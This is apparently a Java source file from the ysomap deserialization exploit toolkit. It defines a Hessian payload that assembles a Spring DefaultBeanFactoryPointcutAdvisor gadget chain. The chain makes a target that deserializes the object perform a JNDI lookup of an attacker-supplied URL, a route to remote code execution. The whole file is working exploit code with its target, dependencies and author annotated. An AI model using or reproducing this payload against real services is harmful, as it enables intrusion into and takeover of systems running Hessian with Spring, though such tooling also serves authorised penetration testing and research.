package ysomap.payloads.hessian;

import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.BeanFactory;
import ysomap.bullets.Bullet;
import ysomap.bullets.spring.SpringJndiBullet1;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3p1g
 * @since 2021/8/5
 */
@Payloads
@Authors({ Authors.MBECHLER })
@Targets({Targets.HESSIAN})
@Require(bullets = {"SpringJndiBullet1"},param = false)
@Dependencies({"org.springframework:spring-context","org.springframework:spring-aop"})
public class SpringAbstractBeanFactoryPointcutAdvisor extends HessianPayload{
    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return SpringJndiBullet1.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory((BeanFactory) obj);
        pcadv.setAdviceBeanName(ReflectionHelper.get(bullet,"jndiURL"));
        return PayloadHelper.makeMap(new DefaultBeanFactoryPointcutAdvisor(), pcadv);
    }
}
